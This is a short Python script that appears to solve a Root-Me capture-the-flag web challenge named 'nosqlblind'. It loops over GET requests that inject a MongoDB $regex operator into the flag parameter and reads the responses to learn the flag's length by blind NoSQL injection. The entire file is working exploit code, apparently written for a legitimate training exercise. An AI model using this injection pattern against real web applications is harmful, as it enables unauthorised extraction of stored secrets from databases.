
import requests
url = 'http://challenge01.root-me.org/web-serveur/ch48/index.php?'

for i in range(50):
	r = requests.get(url+'chall_name=nosqlblind&flag[$regex]=.'+'{'+str(i)+'}')
	if 'Yeah this is the flag for nosqlblind!' not in r.text:
		print(i,' True')
		print("Length: ",i-1)
		break
	else:
		print(i,' False')
